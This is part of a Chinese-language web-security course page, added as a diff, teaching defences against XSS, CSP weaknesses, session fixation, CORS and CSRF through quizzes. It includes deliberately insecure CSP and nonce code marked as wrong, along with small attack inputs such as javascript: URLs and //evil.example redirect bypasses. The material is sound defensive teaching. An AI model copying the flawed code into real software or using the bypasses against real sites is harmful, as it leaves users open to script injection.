+// 計數器：每次都不同，但完全可以預測
+let counter = 0
+function newNonce(): string {
+  const bytes = new Uint8Array(16)
+  new DataView(bytes.buffer).setUint32(12, ++counter)
+  let binary = ''
+  for (const b of bytes) binary += String.fromCharCode(b)
+  return btoa(binary)
+}
+
+function cspHeader(nonce: string, opts: { reportOnly: boolean }): [name: string, value: string] {
+  const name = opts.reportOnly ? 'Content-Security-Policy-Report-Only' : 'Content-Security-Policy'
+  return [name, `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`]
+}
+</script>
+  <script type="wrong">
+// 只取 8 bytes 亂數再重複一次湊成 16 bytes：只有 64 bits
+function newNonce(): string {
+  const half = crypto.getRandomValues(new Uint8Array(8))
+  let binary = ''
+  for (const b of [...half, ...half]) binary += String.fromCharCode(b)
+  return btoa(binary)
+}
+
+function cspHeader(nonce: string, opts: { reportOnly: boolean }): [name: string, value: string] {
+  const name = opts.reportOnly ? 'Content-Security-Policy-Report-Only' : 'Content-Security-Policy'
+  return [name, `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`]
+}
+</script>
+  <script type="wrong">
+// 網域清單、沒有 nonce
+function newNonce(): string {
+  const bytes = crypto.getRandomValues(new Uint8Array(16))
+  let binary = ''
+  for (const b of bytes) binary += String.fromCharCode(b)
+  return btoa(binary)
+}
+
+function cspHeader(nonce: string, opts: { reportOnly: boolean }): [name: string, value: string] {
+  const name = opts.reportOnly ? 'Content-Security-Policy-Report-Only' : 'Content-Security-Policy'
+  return [name, `script-src 'self' https://cdn.jsdelivr.net; object-src 'none'; base-uri 'none'`]
+}
+</script>
+  <script type="wrong">
+// 少了 base-uri
+function newNonce(): string {
+  const bytes = crypto.getRandomValues(new Uint8Array(16))
+  let binary = ''
+  for (const b of bytes) binary += String.fromCharCode(b)
+  return btoa(binary)
+}
+
+function cspHeader(nonce: string, opts: { reportOnly: boolean }): [name: string, value: string] {
+  const name = opts.reportOnly ? 'Content-Security-Policy-Report-Only' : 'Content-Security-Policy'
+  return [name, `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'`]
+}
+</script>
+  <script type="wrong">
+// 加了 'unsafe-inline'
+function newNonce(): string {
+  const bytes = crypto.getRandomValues(new Uint8Array(16))
+  let binary = ''
+  for (const b of bytes) binary += String.fromCharCode(b)
+  return btoa(binary)
+}
+
+function cspHeader(nonce: string, opts: { reportOnly: boolean }): [name: string, value: string] {
+  const name = opts.reportOnly ? 'Content-Security-Policy-Report-Only' : 'Content-Security-Policy'
+  return [name, `script-src 'nonce-${nonce}' 'strict-dynamic' 'unsafe-inline'; object-src 'none'; base-uri 'none'`]
+}
+</script>
+  <script type="wrong">
+// reportOnly 的標頭名稱寫錯
+function newNonce(): string {
+  const bytes = crypto.getRandomValues(new Uint8Array(16))
+  let binary = ''
+  for (const b of bytes) binary += String.fromCharCode(b)
+  return btoa(binary)
+}
+
+function cspHeader(nonce: string, opts: { reportOnly: boolean }): [name: string, value: string] {
+  return ['Content-Security-Policy', `script-src 'nonce-${nonce}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`]
+}
+</script>
+</div>
+
+<div class="quiz" data-correct="c">
+  <p>練習 4：把 access token 從 localStorage 移到 HttpOnly cookie，XSS 就沒有威脅了嗎？</p>
+  <label data-key="a">沒有威脅了，JavaScript 讀不到 HttpOnly cookie，攻擊者拿不到登入狀態</label>
+  <label data-key="b">沒有威脅了，而且 HttpOnly cookie 也會擋掉惡意腳本執行</label>
+  <label data-key="c">仍然有：腳本可以直接發同源請求，瀏覽器自動帶上 cookie，以使用者的身分做任何事</label>
+  <label data-key="d">仍然有，因為 HttpOnly cookie 可以用 document.cookie 讀到</label>
+  <p class="why">✓ HttpOnly 讓 token 不會被讀走、帶到攻擊者的電腦離線使用，這是降低損害。但惡意腳本跟你的前端同源，<code>fetch('/api/…', { credentials: 'include' })</code> 會帶 cookie、讀得到回應，CSRF 防護也不擋（session riding）。HttpOnly 不影響腳本能不能執行；<code>document.cookie</code> 也確實讀不到 HttpOnly cookie，d 的理由錯了。防 XSS 靠輸出編碼、清理與 CSP。</p>
+</div>
+
+<div class="quiz" data-correct="b">
+  <p>練習 5：Vue 元件裡有三處顯示評論資料：<code>{{ review.text }}</code>、<code>&lt;div v-html="review.text"&gt;</code>、<code>&lt;a :href="review.link"&gt;</code>。哪些會被 XSS？</p>
+  <label data-key="a">都不會，Vue 會自動跳脫所有綁定</label>
+  <label data-key="b">v-html 與 :href 會；{{ }} 不會</label>
+  <label data-key="c">只有 v-html 會，屬性綁定都會跳脫所以 :href 安全</label>
+  <label data-key="d">三個都會，Vue 不處理 XSS</label>
+  <p class="why">✓ <code>{{ }}</code> 用 <code>textContent</code> 寫入，內容一律當文字。<code>v-html</code> 直接設 <code>innerHTML</code>，Vue 不跳脫。<code>:href</code> 會跳脫引號，所以跳不出屬性，但 <code>javascript:alert(1)</code> 不需要任何特殊字元，點下去就執行，所以 c 錯：網址要解析並只允許 http／https（練習 2），Vue 建議在後端存入前就清理。</p>
+</div>
+
+<div class="quiz" data-correct="a">
+  <p>練習 6：網站送出 <code>Content-Security-Policy: script-src 'self' https://cdn.jsdelivr.net</code>，也確實沒有任何 inline 腳本。為什麼仍然可能被 XSS？</p>
+  <label data-key="a">攻擊者注入 &lt;script src="https://cdn.jsdelivr.net/npm/…"&gt; 載入任何人都能發布的套件或可被利用的舊函式庫，完全符合清單</label>
+  <label data-key="b">CSP 只在 HTTPS 生效，HTTP 的頁面不受保護</label>
+  <label data-key="c">'self' 允許了 inline 腳本與 onerror 事件屬性</label>
+  <label data-key="d">不可能，有 CSP 就不會被 XSS</label>
+  <p class="why">✓ 網域清單信任的是「整個網域上的所有檔案」。CDN 上有所有 npm 套件，也有舊版 AngularJS、JSONP 端點這類能執行任意程式的工具，攻擊者只要用標籤載入就符合政策。<code>'self'</code> 不允許 inline 腳本（那要 <code>'unsafe-inline'</code>），c 錯；CSP 不分 HTTP、HTTPS，b 錯。改用 nonce 加 <code>'strict-dynamic'</code>，只認這次回應的隨機值。</p>
+</div>
+
+<h2>常見錯誤</h2>
+<ul>
+  <li><strong>用 <code>v-html</code> 顯示使用者的內容</strong>：Vue 不會跳脫。用 <code>{{ }}</code>；真的要格式就用 DOMPurify 允許清單清理，或放進沙箱 iframe。</li>
+  <li><strong><code>:href</code> 直接綁使用者給的網址</strong>：<code>javascript:</code> 點下去就執行。用 <code>new URL</code> 解析，只允許 <code>http:</code>、<code>https:</code>，最好在後端存入前就檢查。</li>
+  <li><strong>自己寫正規表示式清理 HTML 或檢查網址</strong>：大小寫、空白、tab、巢狀標籤都能繞過。HTML 用 DOMPurify，網址用 URL 解析器。</li>
+  <li><strong>輸入時過濾 <code>&lt; &gt;</code> 就以為防住了</strong>：擋不住屬性與網址，還會弄壞正常資料。依輸出位置編碼。</li>
+  <li><strong>以為 HttpOnly 就不怕 XSS</strong>：它只讓 token 不被讀走，腳本照樣能以使用者身分發同源請求。</li>
+  <li><strong>CSP 加 <code>'unsafe-inline'</code>，或把整個 CDN 加進允許清單</strong>：等於沒擋。用 nonce（或 hash）加 <code>'strict-dynamic'</code>，再加 <code>object-src 'none'</code>、<code>base-uri 'none'</code>。</li>
+  <li><strong>nonce 寫死或所有回應共用</strong>：攻擊者看一次就知道。每個回應用 <code>crypto.getRandomValues</code> 產生 16 bytes 以上。</li>
+  <li><strong>直接上正式的 CSP</strong>：可能擋掉正常功能。先用 <code>Content-Security-Policy-Report-Only</code> 觀察。</li>
+  <li><strong>回應 JSON 卻標成 <code>text/html</code>，或沒有 <code>nosniff</code></strong>：直接打開 API 網址就會執行 JSON 裡的 HTML。</li>
+  <li><strong>只有前端跳脫</strong>：後端產生的 email、PDF、後台頁面也輸出 HTML，模板引擎要開自動跳脫。</li>
+  <li><strong>登入後的 <code>next</code> 只檢查開頭是 <code>/</code></strong>：<code>//evil.example</code>、<code>/\evil.example</code> 都會跳走。用 <code>new URL(next, 自己的來源)</code> 比對 origin，結果是 <code>//</code> 開頭也拒絕。</li>
+</ul>
+
+<h2>小結</h2>
+<ul>
+  <li>XSS 是資料被拼進程式碼、讓攻擊者的程式以你網站的來源執行：儲存型在資料庫、反射型在網址、DOM 型是前端自己把不可信的資料塞進危險注入點。找漏洞就從危險注入點往回追值的來源。</li>
+  <li>XSS 得手後，localStorage 的 token 被讀走；HttpOnly cookie 讀不到，但腳本能直接發同源請求（session riding）。HttpOnly 降低損害，不防 XSS；CSRF 防護也擋不住。敏感操作要再確認身分。</li>
+  <li>第一層防線在輸出：HTML 內容與屬性用 HTML 編碼（<code>&amp;</code> 先換、屬性加引號），資料不要拼進 <code>&lt;script&gt;</code>。Vue 的 <code>{{ }}</code> 自動跳脫，<code>v-html</code> 與網址不會；後端的 JSON 要標對 <code>Content-Type</code> 加 <code>nosniff</code>，後端產生的 HTML 要開自動跳脫。</li>
+  <li>網址用 <code>new URL</code> 解析並只允許 http／https；登入後的 <code>next</code> 用 <code>new URL(next, 自己的來源)</code> 解析，origin 完全相等才導回，結果以 <code>//</code> 開頭也拒絕。</li>
+  <li>要顯示 HTML 時用 DOMPurify 允許清單清理，或放進沙箱 iframe；不要自己寫正規表示式。</li>
+  <li>第二層是嚴格 CSP：<code>script-src 'nonce-…' 'strict-dynamic'; object-src 'none'; base-uri 'none'</code>，nonce 每個回應用 CSPRNG 產生 128 bits 以上；不用網域清單、不加 <code>'unsafe-inline'</code>；先用 Report-Only 上線。Vite 用 <code>html.cspNonce</code> 留位置，helmet 的預設 CSP 要自己改成嚴格版。</li>
+  <li>Trusted Types 讓危險注入點只接受 policy 產生的值，審查範圍縮到 <code>createPolicy</code> 那幾行。</li>
+</ul>
+
+<h2>階段檢核：面試會問的觀念</h2>
+<p>這個階段一定要講得出來的 8 件事。先在心裡回答，再選。</p>
+
+<div class="quiz" data-correct="c">
+  <p>練習 7：顧客逛菜單時就發了匿名 session（存購物車），登入的程式這樣寫。哪裡會出事？</p>
+<pre>async function login(req, res) {
+  const user = await verifyPassword(req.body.email, req.body.password)
+  if (!user) return res.status(401).end()
+  const session = await store.get(req.cookies['__Host-sid'])
+  session.userId = user.id
+  await store.save(session)
+  res.status(204).end()
+}</pre>
+  <label data-key="a">只存了 userId，應該把角色也存進 session，之後的請求才不用每次查權限</label>
+  <label data-key="b">登入回應沒有重新送 <code>Set-Cookie</code>，瀏覽器會把這個 session 當成過期</label>
+  <label data-key="c">沿用登入前的 ID，攻擊者事先塞給使用者的 ID，登入後就代表這個使用者</label>
+  <label data-key="d">登入前就發 session 是錯的，匿名 session 本身就會造成 session fixation</label>
+  <p class="why">✓ 這是 session fixation：攻擊者手上的 ID 在受害者登入後就升級成受害者的身分。修法是登入成功時建立新 session、刪掉舊的、把購物車搬過去；權限提升、改密碼時也一樣。d 錯在匿名 session 沒問題，問題是權限改變時沒有換 ID。（第 4 課）</p>
+</div>
+
+<div class="quiz" data-correct="a">
+  <p>練習 8：session cookie 目前是 <code>sid=…; Domain=coffee.example; Path=/; Secure; HttpOnly; SameSite=Lax</code>。行銷要把活動頁 <code>promo.coffee.example</code> 外包出去，怎麼改最能限制活動頁對登入狀態的影響？</p>
+  <label data-key="a">拿掉 Domain、改名成 <code>__Host-sid</code>，讓它只屬於設定它的那台主機</label>
+  <label data-key="b">改成 <code>SameSite=Strict</code>，讓活動頁發的請求不帶這個 cookie</label>
+  <label data-key="c">不用改，HttpOnly 已經讓活動頁的 JavaScript 讀不到這個 cookie</label>
+  <label data-key="d">把 Path 改成 <code>/api</code>，活動頁的路徑就收不到這個 cookie</label>
+  <p class="why">✓ 寫了 Domain，cookie 會送到所有子網域，子網域也能寫同名 cookie 蓋掉它。<code>__Host-</code> 要求不能有 Domain、<code>Path=/</code>、<code>Secure</code>，瀏覽器保證子網域寫不進來。b 錯在 SameSite 看的是站，子網域彼此同站，Strict 照樣帶。（第 4 課）</p>
+</div>
+
+<div class="quiz" data-correct="d">
+  <p>練習 9：新前台 <code>order.coffee.example</code> 的「快速點單」用 <code>fetch</code> 送 POST，body 是 <code>URLSearchParams</code>，API 只檢查 session cookie，CORS 清單卻忘了加這個來源。console 出現 CORS 錯誤，顧客以為失敗又按了兩次，後台出現三筆訂單。為什麼？</p>
+  <label data-key="a">預檢沒通過時，瀏覽器會自動重送真正的請求，才多出兩筆</label>
+  <label data-key="b">CORS 錯誤代表請求沒送到，這三筆是顧客在別的分頁下的</label>
+  <label data-key="c">預檢被認證擋成 401，瀏覽器改用不帶 cookie 的方式送出</label>
+  <label data-key="d">表單格式的 POST 是簡單請求，不預檢，每次都送到伺服器執行了</label>
+  <p class="why">✓ 同源政策擋的是讀回應，不是送請求。簡單請求直接送出，伺服器照常建立訂單，回應回來後瀏覽器才做 CORS 檢查，只是不交給 JS。修法是把新來源加進允許清單，並記得 CORS 錯誤不代表伺服器沒執行。b 是最常見的誤解。（第 5 課）</p>
+</div>
+
+<div class="quiz" data-correct="b">
+  <p>練習 10：API 的 CORS 這樣寫。哪裡會出事？</p>
+<pre>function corsHeaders(origin) {
+  if (origin &amp;&amp; origin.endsWith('coffee.example')) {
+    return {
+      'Access-Control-Allow-Origin': origin,
+      'Access-Control-Allow-Credentials': 'true',
+      'Vary': 'Origin',
+    }
+  }
+  return { 'Vary': 'Origin' }
+}</pre>
+  <label data-key="a">帶 credentials 時不能回明確的來源，Allow-Origin 要用 <code>*</code></label>
+  <label data-key="b"><code>https://evilcoffee.example</code> 也會通過，它的 JS 能帶著使用者的 cookie 讀回應</label>
+  <label data-key="c">拒絕的回應不該加 <code>Vary: Origin</code>，快取會存太多份而出錯</label>
+  <p class="why">✓ <code>endsWith</code> 只比字尾，攻擊者買一個 <code>evilcoffee.example</code> 就通過，再加上 Allow-Credentials，等於讓它以使用者身分讀 API。修法是把允許的來源完整列出、逐字比對。a 正好相反：帶 credentials 時 <code>*</code> 不算數，一定要回明確的來源。（第 5 課）</p>
+</div>
+
+<div class="quiz" data-correct="a">
+  <p>練習 11：session cookie 明寫 <code>SameSite=Strict</code>，會改狀態的 API 都用 POST。同事提議拿掉伺服器端的 Fetch Metadata 檢查，理由是 Strict 已經擋住所有 CSRF。哪個情況會出事？</p>
+  <label data-key="a">外包的活動頁 <code>promo.coffee.example</code> 有 XSS，它發出的 POST 跟 API 同站，cookie 照帶</label>
+  <label data-key="b">evil.example 用自動送出的表單 POST，表單送出算頂層導覽，Strict 會帶 cookie</label>
+  <label data-key="c">Firefox 沒有 SameSite 的預設值，所以明寫的 Strict 在 Firefox 不會生效</label>
+  <label data-key="d">顧客從 Gmail 的信點連結進來後下單，這張訂單會被當成 CSRF 擋掉</label>
+  <p class="why">✓ SameSite 看的是站，子網域彼此同站，Strict 擋不住被入侵或被接管的子網域。Fetch Metadata 檢查會看到 <code>Sec-Fetch-Site: same-site</code> 並拒絕，所以 SameSite 是縱深防禦，伺服器端的檢查要留著。b 錯在 Strict 對任何跨站請求都不帶 cookie，頂層導覽也一樣。（第 6 課）</p>
+</div>
+
+<div class="quiz" data-correct="c">
+  <p>練習 12：咖啡店有綁 session 的 CSRF token、<code>SameSite=Strict</code>、<code>HttpOnly</code>。評論區被發現有儲存型 XSS，攻擊者能以看到評論的顧客身分取消訂單嗎？</p>
+  <label data-key="a">不能：CSRF token 放在頁面和標頭裡，攻擊者猜不到它的值</label>
+  <label data-key="b">不能：Strict 和 HttpOnly 讓惡意腳本發的請求不帶 cookie</label>
+  <label data-key="c">能：腳本跟前端同源，可以從頁面讀出 token 再發請求，cookie 自動帶上</label>
+  <label data-key="d">能：腳本會先用 <code>document.cookie</code> 讀出 session ID，再傳回去冒用</label>
+  <p class="why">✓ CSRF 防護擋的是別的網站；XSS 的腳本就跑在你的網站上，讀得到頁面上的 token，發的是同源請求，SameSite 也不擋。所以 XSS 會打敗所有 CSRF 防護，要靠輸出編碼、清理和 CSP 讓它不發生。a 錯在攻擊者不用猜，直接讀。（第 6、7 課）</p>
+</div>
+
+<div class="quiz" data-correct="d">
+  <p>練習 13：PM 要讓店長自己排版公告（粗體、清單、連結）。後台裝了富文字編輯器，前台用 <code>v-html</code> 顯示。顯示端該怎麼做？</p>
+  <label data-key="a">存進資料庫前，用正規表示式移除 <code>&lt;script&gt;</code> 標籤和 on 開頭的屬性</label>
+  <label data-key="b">編輯器只做得出粗體、清單、連結，內容可以直接交給 <code>v-html</code></label>
+  <label data-key="c">改用 <code>{{ }}</code> 輸出，讓 Vue 自動跳脫所有內容</label>
+  <label data-key="d">顯示前用 DOMPurify 的允許清單，只留需要的標籤和屬性</label>
+  <p class="why">✓ 要顯示格式就不能跳脫，要清理：用成熟的函式庫解析 HTML，只留允許清單上的標籤與屬性。b 錯在編輯器只管輸入，有人直接打 API 就能存進任何 HTML；a 的正規表示式追不上瀏覽器的解析規則；c 會把標籤原樣顯示出來。（第 7 課）</p>
+</div>
+
+<div class="quiz" data-correct="b">
+  <p>練習 14：伺服器渲染的菜單頁加了嚴格 CSP。同事為了省效能，nonce 在啟動時產生一次。哪裡會出事？</p>
+<pre>const NONCE = newNonce()  // 啟動時產生一次，所有請求共用
+
+app.get('/menu', (req, res) => {
+  res.setHeader('Content-Security-Policy',
+    `script-src 'nonce-${NONCE}' 'strict-dynamic'; object-src 'none'; base-uri 'none'`)
+  res.send(renderMenu(NONCE))
+})</pre>
+  <label data-key="a">nonce 要用十六進位，瀏覽器不認得 base64 的 nonce</label>
+  <label data-key="b">攻擊者打開一次頁面就知道 nonce，注入的 script 帶上它就能執行</label>
+  <label data-key="c">少了 <code>'unsafe-inline'</code>，頁面上帶 nonce 的 inline 腳本會被擋</label>
+  <label data-key="d"><code>'strict-dynamic'</code> 讓注入的腳本可以用 <code>createElement</code> 載入任何檔案</label>
+  <p class="why">✓ nonce 的作用是攻擊者猜不到這一次的值；所有回應共用，看一次自己的頁面就拿到了，CSP 等於沒有。每個回應都要用 CSPRNG 產生 128 bits 以上的新值。d 錯在 <code>'strict-dynamic'</code> 只延伸信任給已被 nonce 放行的腳本，沒有正確 nonce 的注入腳本跑不起來；這裡的洞是 nonce 被知道了。（第 7 課）</p>
+</div>
+<p>這個階段的重點整理成<a href="../sheets/stage-2.html">一頁圖解</a>。</p>
+<p>下一課：Token 與 JWT。拆開一個 JWT，看它的結構、HMAC 與公鑰簽章，以及為什麼它不是加密。</p>
+
+</main>
+<script type="module" src="../lab.js"></script>
+</body>
+</html>
